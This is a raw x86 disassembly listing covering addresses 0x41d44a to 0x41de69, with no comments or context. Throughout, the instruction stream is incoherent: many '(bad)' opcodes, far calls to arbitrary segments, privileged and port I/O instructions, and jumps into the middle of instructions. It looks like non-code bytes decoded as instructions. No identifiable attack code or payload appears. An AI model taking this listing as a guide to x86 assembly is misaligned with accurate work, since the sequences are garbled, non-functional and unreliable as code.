  41d44a:	xor    bh,BYTE PTR [esi-0x792035b8]
  41d450:	cwde   
  41d451:	sbb    ch,al
  41d453:	pop    ds
  41d454:	ja     0x41d3fe
  41d456:	mov    ds,WORD PTR [ebx-0x20363963]
  41d45c:	test   al,0xfc
  41d45e:	push   0xffffffb1
  41d460:	xchg   BYTE PTR [edx-0x7],bh
  41d463:	sub    al,0xc9
  41d465:	arpl   WORD PTR [esi+0x4e9ca105],sp
  41d46b:	fcomp  QWORD PTR [esi]
  41d46d:	adc    DWORD PTR [edi-0x10],edx
  41d470:	repnz sar BYTE PTR [esi],0x31
  41d474:	ins    BYTE PTR es:[edi],dx
  41d475:	cs cmp eax,0xb984d12d
  41d47b:	repnz adc ch,BYTE PTR [esp+esi*2]
  41d47f:	ret    0x89
  41d482:	(bad)  
  41d483:	cwde   
  41d484:	shl    DWORD PTR [eax],0x8d
  41d487:	adc    ah,dl
  41d489:	and    BYTE PTR ss:[ecx-0x6c],cl
  41d48d:	sti    
  41d48e:	arpl   WORD PTR [edx+esi*8+0x0],di
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd035:0xf5ec3389
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0x8f000001
  41d50d:	xlat   BYTE PTR ds:[ebx]
  41d50e:	cmp    al,BYTE PTR [edi+0x7f3edb3b]
  41d514:	jae    0x41d4ff
  41d516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d517:	jge    0x41d52d
  41d519:	(bad)  
  41d51a:	int    0xa9
  41d51c:	sbb    ecx,eax
  41d51e:	ret    
  41d51f:	stos   BYTE PTR es:[edi],al
  41d520:	xchg   edx,eax
  41d521:	mov    dh,0x4f
  41d523:	cmp    DWORD PTR [edi],0xf596ef74
  41d529:	xchg   edi,eax
  41d52a:	xor    DWORD PTR [esp+ebp*4+0x7fbee478],ecx
  41d531:	push   edx
  41d532:	ins    BYTE PTR es:[edi],dx
  41d533:	fs xor esi,edi
  41d536:	call   0x613a:0xb50cc6cb
  41d53d:	(bad)  
  41d53e:	sahf   
  41d53f:	or     DWORD PTR ds:0x7baee032,0xffffffc1
  41d546:	sti    
  41d547:	imul   ebp,DWORD PTR [edx+0x1d],0x1e15f5ca
  41d54e:	mov    WORD PTR [ecx+0xd9faa2c],fs
  41d554:	or     BYTE PTR [eax+0x26],bh
  41d557:	dec    edi
  41d558:	repz ror BYTE PTR [esi+edi*8],1
  41d55c:	ds ror esi,0x1b
  41d560:	dec    ebx
  41d561:	loop   0x41d56c
  41d563:	cld    
  41d564:	call   0xe1f8:0x4818f965
  41d56b:	cmp    esp,DWORD PTR [eax]
  41d56d:	cdq    
  41d56e:	cs in  al,dx
  41d570:	xchg   ebx,eax
  41d571:	jle    0x41d54c
  41d573:	ins    BYTE PTR es:[edi],dx
  41d574:	out    dx,al
  41d575:	cdq    
  41d576:	adc    al,0xd7
  41d578:	inc    esp
  41d579:	sahf   
  41d57a:	dec    ecx
  41d57b:	inc    eax
  41d57c:	or     edx,ebp
  41d57e:	push   ebp
  41d57f:	add    al,0x67
  41d581:	aaa    
  41d582:	mov    esi,0x5d04756c
  41d587:	mov    edi,0xed4131f2
  41d58c:	test   DWORD PTR [esi+0x481f7c98],0x3d8e921d
  41d596:	push   0x20e93f24
  41d59b:	sbb    eax,0xdde40704
  41d5a0:	dec    esi
  41d5a1:	adc    ch,BYTE PTR [edx]
  41d5a3:	ror    DWORD PTR [ebp-0x1280f6ee],0x2
  41d5aa:	lock icebp 
  41d5ac:	jmp    0x41d53f
  41d5ae:	and    ebx,DWORD PTR [eax+edx*8]
  41d5b1:	jmp    0x41d615
  41d5b3:	fucomip st,st(4)
  41d5b5:	sub    al,0xb2
  41d5b7:	hlt    
  41d5b8:	rol    DWORD PTR [edx],1
  41d5ba:	xlat   BYTE PTR ds:[ebx]
  41d5bb:	mov    cl,0x18
  41d5bd:	mov    ecx,0xf68f8b5a
  41d5c2:	imul   esi,DWORD PTR [esi+esi*1-0x7f],0xfffffff5
  41d5c7:	dec    edi
  41d5c8:	cmp    BYTE PTR gs:[edi],cl
  41d5cb:	sti    
  41d5cc:	and    BYTE PTR [edi],ah
  41d5ce:	ins    BYTE PTR es:[edi],dx
  41d5cf:	adc    ch,bl
  41d5d1:	xchg   edx,eax
  41d5d2:	jmp    0x41d602
  41d5d4:	out    0x5b,eax
  41d5d6:	cli    
  41d5d7:	fwait
  41d5d8:	pop    ss
  41d5d9:	mov    edx,0x66bf34e7
  41d5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5df:	(bad)  
  41d5e0:	xor    ax,0x6ba2
  41d5e4:	inc    edx
  41d5e5:	jo     0x41d59c
  41d5e7:	xchg   DWORD PTR [eax-0xaa9db94],ebp
  41d5ed:	(bad)  
  41d5ef:	jno    0x41d5cf
  41d5f1:	cmp    bl,BYTE PTR [edx]
  41d5f3:	cmp    DWORD PTR [edx+edi*1],ebx
  41d5f6:	or     edi,esi
  41d5f8:	mov    edx,0x5660912a
  41d5fd:	sbb    DWORD PTR [edi],0xfffffff7
  41d600:	and    al,cl
  41d602:	fcomip st,st(7)
  41d604:	or     ah,BYTE PTR [eax+0x66]
  41d607:	mov    edx,0xdf2f6f0a
  41d60c:	mov    bh,0xfa
  41d60e:	das    
  41d60f:	retf   
  41d610:	or     eax,DWORD PTR [eax]
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xc066e435
  41d681:	push   ss
  41d682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d683:	test   ch,dl
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR ds:0xb7000001,al
  41d68d:	adc    esp,DWORD PTR [edi+0x11]
  41d690:	jmp    DWORD PTR [edi]
  41d692:	test   BYTE PTR [ecx+eiz*4+0x40c6a576],dl
  41d699:	pop    ebp
  41d69a:	repnz int 0x7b
  41d69d:	inc    esi
  41d69e:	push   cs
  41d69f:	mov    ebx,0x257fe916
  41d6a4:	xor    al,0x17
  41d6a6:	pop    ss
  41d6a7:	jmp    0x41d6a7
  41d6a9:	inc    ebp
  41d6aa:	and    al,0x7
  41d6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ad:	xchg   ecx,eax
  41d6ae:	mov    eax,ds:0xace9f9fa
  41d6b3:	cmp    BYTE PTR [bx+si],dl
  41d6b6:	xchg   ebp,eax
  41d6b7:	mov    bh,0xbb
  41d6b9:	pop    esi
  41d6ba:	bound  ebx,QWORD PTR [edx+esi*2+0x3d353543]
  41d6c1:	mov    eax,0xf8021a75
  41d6c6:	fmul   DWORD PTR [esi-0x157c855a]
  41d6cc:	mov    BYTE PTR [ebp+0x29],dl
  41d6cf:	lea    esi,[ebx+ebx*2]
  41d6d2:	mov    es,WORD PTR [ebp+0x3aec78c7]
  41d6d8:	push   cs
  41d6d9:	test   eax,0xe1b82eb
  41d6de:	in     eax,dx
  41d6df:	call   0xfe9e:0x5207a8fa
  41d6e6:	adc    DWORD PTR [ebp-0x3a],esi
  41d6e9:	je     0x41d6e0
  41d6eb:	pop    esi
  41d6ec:	test   al,0xad
  41d6ee:	ss xchg bp,ax
  41d6f1:	daa    
  41d6f2:	push   es
  41d6f3:	jle    0x41d6a0
  41d6f5:	cli    
  41d6f6:	mov    eax,cs:0x3b04daa9
  41d6fc:	pop    ss
  41d6fd:	push   eax
  41d6fe:	push   ss
  41d6ff:	push   edx
  41d700:	pop    ss
  41d701:	xchg   DWORD PTR [ebx+0x5f],ecx
  41d704:	scas   eax,DWORD PTR es:[edi]
  41d705:	sbb    al,0xa0
  41d707:	or     eax,0xf2bb41f
  41d70c:	(bad)  
  41d70d:	cld    
  41d70e:	mov    ch,0xed
  41d710:	adc    ah,dh
  41d712:	ins    BYTE PTR es:[edi],dx
  41d713:	popa   
  41d714:	mov    bh,0xb6
  41d716:	mov    ebx,0x8f561c42
  41d71b:	imul   esi,DWORD PTR [ecx-0x3e],0x5c001d93
  41d722:	js     0x41d700
  41d724:	cld    
  41d725:	sti    
  41d726:	(bad)  
  41d727:	aaa    
  41d728:	leave  
  41d729:	das    
  41d72a:	scas   al,BYTE PTR es:[edi]
  41d72b:	in     eax,0x21
  41d72d:	sti    
  41d72e:	pop    esp
  41d72f:	add    BYTE PTR [esi],dl
  41d731:	sti    
  41d732:	mov    ah,0x25
  41d734:	cmp    esp,DWORD PTR ds:0x19c6a1ad
  41d73a:	pushf  
  41d73b:	push   DWORD PTR [ecx-0x7ab9c98]
  41d741:	popf   
  41d742:	jae    0x41d75e
  41d744:	add    ebx,DWORD PTR [edx+0x7b]
  41d747:	jae    0x41d7bf
  41d749:	das    
  41d74a:	nop
  41d74b:	ficom  DWORD PTR [esi]
  41d74d:	xchg   edi,eax
  41d74e:	add    DWORD PTR [ebp+0x25],ebx
  41d751:	and    eax,0x6103ea4e
  41d756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d757:	adc    al,0xc7
  41d759:	data16 shl BYTE PTR [eax],cl
  41d75c:	aas    
  41d75d:	dec    ebp
  41d75e:	push   eax
  41d75f:	or     al,0xa5
  41d761:	sbb    BYTE PTR [edx],bl
  41d763:	test   BYTE PTR [eax+0x28ef7caf],0xf2
  41d76a:	popa   
  41d76b:	call   0x2f2f5b76
  41d770:	ins    DWORD PTR es:[edi],dx
  41d771:	add    ebp,DWORD PTR [esi]
  41d773:	add    dh,BYTE PTR [edi+eax*2+0x53fe5d7]
  41d77a:	xchg   edx,eax
  41d77b:	cli    
  41d77c:	outs   dx,DWORD PTR ds:[esi]
  41d77d:	out    dx,al
  41d77e:	loope  0x41d7c8
  41d780:	jo     0x41d7f1
  41d782:	inc    esi
  41d783:	jo     0x41d7b5
  41d785:	push   edi
  41d786:	mov    cl,0x2f
  41d788:	lahf   
  41d789:	cs xor eax,0x28316d51
  41d78f:	bound  ecx,QWORD PTR [ebp+0x0]
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	add    ebx,DWORD PTR [edi]
  41d802:	and    eax,0x139dab5
  41d807:	add    BYTE PTR ds:0x54000001,al
  41d80d:	bound  eax,QWORD PTR [ebx+0x7a225195]
  41d813:	and    esi,ebp
  41d815:	ins    BYTE PTR es:[edi],dx
  41d816:	xor    edi,DWORD PTR [ebx-0x22331f53]
  41d81c:	test   al,0x43
  41d81e:	jg     0x41d7b9
  41d820:	aas    
  41d821:	pop    ecx
  41d822:	mov    WORD PTR [eax],es
  41d824:	sub    al,BYTE PTR ds:0xb2fe480a
  41d82a:	xchg   ebp,eax
  41d82b:	cmp    eax,0x1ab2159c
  41d830:	inc    ebx
  41d831:	jbe    0x41d889
  41d833:	out    dx,al
  41d834:	aad    0xfb
  41d836:	cwde   
  41d837:	pop    esi
  41d838:	pop    ebx
  41d839:	adc    eax,0xa156ec15
  41d83e:	mov    BYTE PTR [eax-0x5d60d4ce],bh
  41d844:	mov    cl,0x15
  41d846:	shl    BYTE PTR [ecx+0x63b51c30],1
  41d84c:	push   0xb5273d24
  41d851:	jb     0x41d805
  41d853:	seto   BYTE PTR [ecx+0x42f82027]
  41d85a:	bound  edx,QWORD PTR [esi-0x51]
  41d85d:	call   0x23b81677
  41d862:	and    DWORD PTR [ebx-0x1cc7552d],ecx
  41d868:	mov    ebp,0x6909c8ca
  41d86d:	int    0x5c
  41d86f:	in     al,0x7
  41d871:	inc    ecx
  41d872:	pushf  
  41d873:	rcl    esp,cl
  41d875:	fisubr DWORD PTR [ecx+esi*1]
  41d878:	xor    bl,BYTE PTR [eax+0x4ed2f4d2]
  41d87e:	test   edx,esp
  41d880:	fbstp  TBYTE PTR [edx+0x74d88de0]
  41d886:	les    esp,FWORD PTR [ecx-0x1e]
  41d889:	push   ecx
  41d88a:	mov    esi,eax
  41d88c:	push   ebp
  41d88d:	sar    BYTE PTR [eax+0x4f],0xb0
  41d891:	repnz mov bh,0xb3
  41d894:	aas    
  41d895:	mov    bl,0x60
  41d897:	js     0x41d87f
  41d899:	xchg   edi,eax
  41d89a:	pushf  
  41d89b:	push   ecx
  41d89c:	push   0xc691002e
  41d8a1:	jnp    0x41d8f6
  41d8a3:	pop    edx
  41d8a4:	js     0xbb8b5ab
  41d8aa:	xor    al,0x49
  41d8ac:	cmp    eax,DWORD PTR ds:0xcb0c0aa1
  41d8b2:	loop   0x41d83a
  41d8b4:	push   edx
  41d8b5:	pushf  
  41d8b6:	cli    
  41d8b7:	dec    eax
  41d8b8:	(bad)  
  41d8b9:	(bad)  
  41d8ba:	jmp    0x7d3f:0xd3c78595
  41d8c1:	sti    
  41d8c2:	or     bh,ch
  41d8c4:	sahf   
  41d8c5:	iret   
  41d8c6:	adc    DWORD PTR [ecx-0x60],edx
  41d8c9:	jg     0x41d8c0
  41d8cb:	or     al,0x4d
  41d8cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ce:	idiv   dh
  41d8d0:	push   edx
  41d8d1:	jnp    0x41d8db
  41d8d3:	cmp    ax,0xca98
  41d8d7:	repz push 0x10781393
  41d8dd:	or     bh,BYTE PTR [esi-0x9]
  41d8e0:	out    0xb5,al
  41d8e2:	das    
  41d8e3:	repnz (bad) 
  41d8e5:	jnp    0x41d8a9
  41d8e7:	jle    0x41d95d
  41d8e9:	push   ds
  41d8ea:	pop    ecx
  41d8eb:	adc    ah,BYTE PTR [eax+ecx*2]
  41d8ee:	jle    0x41d87c
  41d8f0:	repnz dec edi
  41d8f2:	dec    ecx
  41d8f3:	ret    0x3be1
  41d8f6:	add    cl,dl
  41d8f8:	je     0x41d953
  41d8fa:	es mov cl,0x67
  41d8fd:	add    edi,ebp
  41d8ff:	mov    bl,0x4e
  41d901:	xchg   ebx,eax
  41d902:	sbb    BYTE PTR [edx+0x33],0xc2
  41d906:	inc    edi
  41d907:	xchg   BYTE PTR [eax],bh
  41d909:	ffree  st(5)
  41d90b:	or     bl,BYTE PTR ds:0xd017b4fd
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs hlt 
  41d981:	push   esi
  41d982:	ss push ebp
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0x96000001
  41d98d:	cmp    BYTE PTR [eax],cl
  41d98f:	(bad)  
  41d990:	cmp    ecx,eax
  41d992:	lock lods eax,DWORD PTR ds:[esi]
  41d994:	dec    ecx
  41d995:	xor    al,0x31
  41d997:	ret    
  41d998:	retf   
  41d999:	xchg   edi,eax
  41d99a:	and    al,0xb8
  41d99c:	mov    ah,0xa3
  41d99e:	mov    WORD PTR [edi],fs
  41d9a0:	loope  0x41d9e8
  41d9a2:	and    al,0xf3
  41d9a4:	jne    0x41d9a5
  41d9a6:	inc    edx
  41d9a7:	add    cl,bh
  41d9a9:	out    0x66,eax
  41d9ab:	push   edi
  41d9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ad:	sub    eax,0x50388a58
  41d9b2:	and    al,0xf
  41d9b4:	ins    DWORD PTR es:[edi],dx
  41d9b5:	dec    esi
  41d9b6:	nop
  41d9b7:	sbb    edi,edi
  41d9b9:	jns    0x41d9f8
  41d9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9bc:	mov    bh,0xfb
  41d9be:	mov    al,0xd8
  41d9c0:	xchg   DWORD PTR ds:0x21987dba,edi
  41d9c6:	test   BYTE PTR [ebp-0x6af504c3],dh
  41d9cc:	push   es
  41d9cd:	cmp    cl,BYTE PTR [eax-0x16c6febf]
  41d9d3:	inc    edi
  41d9d4:	repnz or ebx,DWORD PTR [ecx-0x6e124817]
  41d9db:	test   BYTE PTR [edx-0x5de96118],dl
  41d9e1:	jno    0x41da5e
  41d9e3:	repnz mov ah,0x67
  41d9e6:	call   0x6772:0x70af0091
  41d9ed:	or     eax,0x1762a2c3
  41d9f2:	outs   dx,DWORD PTR ds:[esi]
  41d9f3:	inc    eax
  41d9f4:	out    dx,eax
  41d9f5:	imul   ebx,DWORD PTR [ebx+0x33],0xa9a4a1c9
  41d9fc:	push   cs
  41d9fd:	and    esp,DWORD PTR [ebp-0x752280a9]
  41da03:	lock mov ebp,0xde341752
  41da09:	mov    es,WORD PTR [edx]
  41da0b:	test   eax,0x220cb643
  41da10:	sti    
  41da11:	sub    al,0xca
  41da13:	ins    DWORD PTR es:[edi],dx
  41da14:	dec    ebx
  41da15:	mov    dl,0x3a
  41da17:	mov    bh,0xd2
  41da19:	sbb    dh,bl
  41da1b:	and    cl,bh
  41da1d:	scas   al,BYTE PTR es:[edi]
  41da1e:	inc    ebp
  41da1f:	mov    ecx,0x142d7ee0
  41da24:	jno    0x41d9c8
  41da26:	mov    edi,0x40e1a8c9
  41da2b:	ins    DWORD PTR es:[edi],dx
  41da2c:	aam    0xc6
  41da2e:	or     bh,BYTE PTR [edi+ecx*1]
  41da31:	push   0x6d
  41da33:	int    0xe6
  41da35:	jg     0x41da32
  41da37:	lock retf 0xb66c
  41da3b:	out    dx,eax
  41da3c:	sub    BYTE PTR [eax+edi*1+0x26838d2b],ah
  41da43:	or     eax,0xf2ec9abe
  41da48:	(bad)  
  41da49:	mov    ds:0xbe3bdfae,eax
  41da4e:	cdq    
  41da4f:	sbb    al,0xca
  41da51:	dec    esi
  41da52:	test   eax,0x41ed965
  41da57:	fnsave [esi+0x6c]
  41da5a:	mov    esi,0x4201a1fd
  41da5f:	ins    DWORD PTR es:[edi],dx
  41da60:	adc    BYTE PTR [ecx-0x66],bh
  41da63:	mov    al,ds:0x5927d041
  41da68:	sbb    eax,0x1b038f10
  41da6d:	test   BYTE PTR [edx-0x7c],al
  41da70:	adc    ch,BYTE PTR [ecx-0x2d38cce2]
  41da76:	xchg   ebx,eax
  41da77:	jmp    0x41da88
  41da79:	jge    0x41dad1
  41da7b:	bndstx [edi+0x6b],(bad)
  41da7f:	(bad)  
  41da80:	out    0x67,eax
  41da82:	outs   dx,DWORD PTR ds:[esi]
  41da83:	sar    bl,cl
  41da85:	outs   dx,BYTE PTR ds:[esi]
  41da86:	(bad)  
  41da87:	cmc    
  41da88:	sub    ebp,DWORD PTR [ecx]
  41da8a:	mov    ds:0xdd94a842,eax
  41da8f:	fs mov ah,0x0
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffd2
  41db01:	pop    esp
  41db02:	add    al,0x5a
  41db04:	in     al,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xe5000001
  41db0d:	or     cl,ch
  41db0f:	jp     0x41da94
  41db11:	add    eax,0x26206dee
  41db16:	mov    ds:0xad600255,eax
  41db1b:	xor    DWORD PTR [esp+ecx*4-0x22466ec3],eax
  41db22:	mov    ds:0xa1546bdd,eax
  41db27:	ins    BYTE PTR es:[edi],dx
  41db28:	je     0x41dafb
  41db2a:	mov    esp,DWORD PTR [ebp-0x6]
  41db2d:	push   eax
  41db2e:	push   es
  41db2f:	rcr    BYTE PTR [edx],cl
  41db31:	mov    esi,DWORD PTR [edx-0x3a3fcaec]
  41db37:	enter  0xda8,0x43
  41db3b:	jmp    edx
  41db3d:	cmp    BYTE PTR [ecx+ecx*2-0x1a],al
  41db41:	add    bl,BYTE PTR gs:[ebx-0x61ca912d]
  41db48:	push   ebx
  41db49:	sbb    al,0xd5
  41db4b:	add    ecx,edi
  41db4d:	mov    al,bl
  41db4f:	mov    cl,0xc2
  41db51:	icebp  
  41db52:	in     eax,dx
  41db53:	mov    esp,0xf4d8808d
  41db58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db59:	dec    ebx
  41db5a:	add    BYTE PTR [eax],cl
  41db5c:	out    0xea,eax
  41db5e:	mov    bh,0x39
  41db60:	sahf   
  41db61:	pshufw mm4,mm7,0xe7
  41db65:	or     ebp,esp
  41db67:	sbb    BYTE PTR [edx],cl
  41db69:	pop    eax
  41db6a:	(bad)  
  41db6b:	pop    ebx
  41db6c:	dec    ecx
  41db6d:	daa    
  41db6e:	jp     0x41db55
  41db70:	call   0xf299:0x5efc0bc6
  41db77:	(bad)  
  41db7a:	mov    edi,0xf1a23e92
  41db7f:	push   esp
  41db80:	sbb    DWORD PTR [ebx+0x17],0x5faade74
  41db87:	shl    edx,1
  41db89:	mov    ecx,0xdb8bae05
  41db8e:	or     eax,edx
  41db90:	mov    esi,0x70ae6dc7
  41db95:	adc    BYTE PTR [eax],0x2f
  41db98:	int3   
  41db99:	cmp    eax,0x937f4344
  41db9e:	aas    
  41db9f:	pop    ss
  41dba0:	popa   
  41dba1:	inc    ebp
  41dba2:	xor    BYTE PTR [edi],cl
  41dba4:	shr    ch,1
  41dba6:	add    ah,BYTE PTR [esi+0x4f7e41b4]
  41dbac:	pop    edx
  41dbad:	popf   
  41dbae:	or     eax,0xd367ad75
  41dbb3:	lahf   
  41dbb4:	mov    ch,0x87
  41dbb6:	adc    al,bl
  41dbb8:	sbb    ebx,DWORD PTR [eax+0x69af00d9]
  41dbbe:	xchg   edx,eax
  41dbbf:	leave  
  41dbc0:	inc    edi
  41dbc1:	push   esp
  41dbc2:	pop    es
  41dbc3:	mov    bh,0x1e
  41dbc5:	add    DWORD PTR [edi],edx
  41dbc7:	and    bl,dl
  41dbc9:	and    edx,ebp
  41dbcb:	ret    
  41dbcc:	or     ebp,eax
  41dbce:	lea    ebp,[eax-0x14]
  41dbd1:	imul   eax,DWORD PTR [esi+esi*8],0xba1561d4
  41dbd8:	mov    DWORD PTR [ecx-0x1a4d8307],esi
  41dbde:	adc    dl,0x2b
  41dbe1:	in     al,dx
  41dbe2:	mov    esi,0xe953adb4
  41dbe7:	(bad)  
  41dbe8:	sub    al,0x43
  41dbea:	nop
  41dbeb:	outs   dx,DWORD PTR ds:[esi]
  41dbec:	test   eax,0xee10ceff
  41dbf1:	lock cld 
  41dbf3:	(bad)  
  41dbf4:	mov    edi,edx
  41dbf6:	gs jge 0x41dbce
  41dbf9:	aas    
  41dbfa:	and    ebx,edx
  41dbfc:	push   edx
  41dbfd:	fucomip st,st(1)
  41dbff:	mov    bl,0x68
  41dc01:	hlt    
  41dc02:	cdq    
  41dc03:	ret    0xef27
  41dc06:	push   0x11
  41dc08:	dec    ecx
  41dc09:	(bad)  
  41dc0a:	jecxz  0x41db98
  41dc0c:	and    dl,BYTE PTR [esi-0xd]
  41dc0f:	xchg   edx,eax
  41dc10:	push   esp
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0x58b0d050]
  41dc81:	jns    0x41dc1c
  41dc83:	xchg   ecx,eax
  41dc84:	jmp    0x541ddc5
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    dl,ah
  41dc8d:	ss or  al,0x5e
  41dc90:	inc    edx
  41dc91:	inc    esi
  41dc92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc93:	sub    DWORD PTR [ebp-0x23e3996f],edi
  41dc99:	push   es
  41dc9a:	mov    WORD PTR [edx+edi*8],es
  41dc9d:	mov    WORD PTR [ecx-0x47],es
  41dca0:	mov    DWORD PTR [ebx-0x5f],edi
  41dca3:	mov    edi,0xc0e126ed
  41dca8:	pop    edi
  41dca9:	sub    eax,0xf07ce0b3
  41dcae:	hlt    
  41dcaf:	push   esi
  41dcb0:	mov    ecx,0x4c24a435
  41dcb5:	push   esi
  41dcb6:	xchg   di,ax
  41dcb8:	test   al,0x50
  41dcba:	push   ecx
  41dcbb:	push   ds
  41dcbc:	lods   eax,DWORD PTR ds:[esi]
  41dcbd:	push   edx
  41dcbe:	data16 and al,0x5e
  41dcc1:	stos   BYTE PTR es:[edi],al
  41dcc2:	aad    0xa8
  41dcc4:	jle    0x41dcf2
  41dcc6:	mov    ebp,0xa4ca5797
  41dccb:	push   0xcc6b516d
  41dcd0:	stos   DWORD PTR es:[edi],eax
  41dcd1:	outs   dx,BYTE PTR ds:[esi]
  41dcd2:	jmp    0x41dc76
  41dcd4:	fadd   QWORD PTR [edi-0x24a80b73]
  41dcda:	and    al,0x39
  41dcdc:	jle    0x41dd40
  41dcde:	adc    al,0xf9
  41dce0:	(bad)  
  41dce1:	loop   0x41dccf
  41dce3:	sub    eax,0xb608ab79
  41dce8:	jno    0x41dd4f
  41dcea:	mov    eax,ds:0xceefd9a9
  41dcef:	iret   
  41dcf0:	test   esp,edx
  41dcf2:	ja     0x41dcca
  41dcf4:	xchg   edx,eax
  41dcf5:	pop    ebp
  41dcf7:	or     esp,DWORD PTR [edx+ebp*8-0x14]
  41dcfb:	push   ebx
  41dcfc:	inc    ebp
  41dcfd:	add    ah,dl
  41dcff:	and    BYTE PTR [edi-0x4531730d],ah
  41dd05:	add    eax,0x901d6a5f
  41dd0a:	inc    esp
  41dd0b:	mov    ds:0xf4ffbc54,al
  41dd10:	aas    
  41dd11:	es std 
  41dd13:	cs mov esi,0x37dcd7e5
  41dd19:	mov    bl,0xf
  41dd1b:	sti    
  41dd1c:	or     eax,0x3dfdbf22
  41dd21:	sbb    edi,DWORD PTR ds:0x1f28a70d
  41dd27:	mov    esi,0x8ccd1b7a
  41dd2c:	and    dl,dh
  41dd2e:	add    eax,0x84edc763
  41dd33:	dec    esi
  41dd34:	test   DWORD PTR [esi+0x68],esp
  41dd37:	(bad)  
  41dd39:	and    edx,DWORD PTR [eax+0x278cac36]
  41dd3f:	sbb    dl,BYTE PTR ds:0xba95
  41dd44:	loop   0x41dcd7
  41dd46:	or     eax,0x788c1cf5
  41dd4b:	xchg   ebx,eax
  41dd4c:	dec    esi
  41dd4d:	jae    0x41dd56
  41dd4f:	inc    edx
  41dd50:	fidiv  WORD PTR [ecx+0x60]
  41dd53:	adc    ebx,DWORD PTR [ecx+0x2f]
  41dd56:	stc    
  41dd57:	xor    eax,0x25966a18
  41dd5c:	jbe    0x41ddcb
  41dd5e:	xor    cl,ah
  41dd60:	fs add al,0xa2
  41dd63:	lods   al,BYTE PTR ds:[esi]
  41dd64:	call   0x6c10:0x6748c718
  41dd6b:	mov    al,bh
  41dd6d:	stc    
  41dd6e:	gs or  DWORD PTR gs:[edx-0x2e],edx
  41dd73:	mov    al,0xba
  41dd75:	cwde   
  41dd76:	jns    0x41dd17
  41dd78:	mov    ecx,0x167ff3b5
  41dd7d:	test   dl,ah
  41dd7f:	sbb    al,BYTE PTR [ebx-0x18039905]
  41dd85:	and    BYTE PTR [ebp-0x783aaede],dl
  41dd8b:	xchg   esi,eax
  41dd8c:	push   edx
  41dd8d:	in     al,dx
  41dd8e:	nop
  41dd8f:	into   
  41dd90:	dec    esi
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	mov    eax,ds:0xeed7f7c7
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	adc    esp,DWORD PTR [eax]
  41de0e:	test   DWORD PTR [edi+0xd2f53bd],esp
  41de14:	loope  0x41dd99
  41de16:	sub    DWORD PTR [eax+0x576b1be6],edi
  41de1c:	push   esi
  41de1d:	sbb    al,0x61
  41de1f:	xchg   DWORD PTR [ebp+0x48],esp
  41de22:	mov    bl,0x29
  41de24:	jp     0x41ddaf
  41de26:	jb     0x41de77
  41de28:	nop
  41de29:	in     eax,0x7a
  41de2b:	retf   
  41de2c:	mov    esi,0x8371c475
  41de31:	mov    eax,ds:0x68e1ba5b
  41de36:	jbe    0x41ddc0
  41de38:	test   al,0x65
  41de3a:	pop    ebp
  41de3b:	(bad)  
  41de3d:	jae    0x41de0c
  41de3f:	jns    0x41de76
  41de41:	xor    eax,0x5b547995
  41de46:	aaa    
  41de47:	outs   dx,BYTE PTR ds:[esi]
  41de48:	outs   dx,BYTE PTR ds:[esi]
  41de49:	pop    ds
  41de4a:	dec    esi
  41de4b:	dec    ebx
  41de4c:	aas    
  41de4d:	pop    ecx
  41de4e:	inc    ebp
  41de4f:	mov    DWORD PTR [ecx-0x22],eax
  41de52:	daa    
  41de53:	dec    eax
  41de54:	aaa    
  41de55:	or     ebp,ebx
  41de57:	mov    eax,0xe855494e
  41de5c:	mov    ah,0xbf
  41de5e:	sub    eax,eax
  41de60:	add    BYTE PTR [edi+0x3e8b0fd0],bh
  41de66:	mov    ?,WORD PTR [ebp+0x2a]
  41de69:	mov    esp,0xe33f400f
